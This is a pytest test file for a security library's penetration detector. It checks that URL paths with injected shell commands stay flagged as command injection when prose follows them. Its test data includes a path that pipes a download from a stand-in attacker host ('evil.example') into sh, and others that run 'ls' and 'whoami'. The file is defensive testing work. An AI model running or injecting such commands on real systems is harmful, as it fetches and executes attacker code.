import pytest

from guard_core.models import SyncSecurityConfig
from guard_core.sync.utils import detect_penetration_attempt
from tests.test_sync.conftest import SyncMockGuardRequest

# D-225: a command in the URL path stays flagged when prose follows it, so no
# suffix gate can be added without failing here (LEDGER 6.363).
PATHS = [
    "/; sh -c 'curl http://evil.example/x|sh' to verify.",
    "/First run setup; sh -c 'ls' to verify.",
    "/ticket note: reproduced by running commands; /bin/sh -c whoami showed root",
]


@pytest.mark.parametrize("path", PATHS)
def test_a_path_command_followed_by_prose_stays_flagged(path: str) -> None:
    config = SyncSecurityConfig(enable_redis=False, enable_penetration_detection=True)

    result = detect_penetration_attempt(SyncMockGuardRequest(path=path), config)

    assert result.is_threat
    assert "cmd_injection" in result.threat_categories
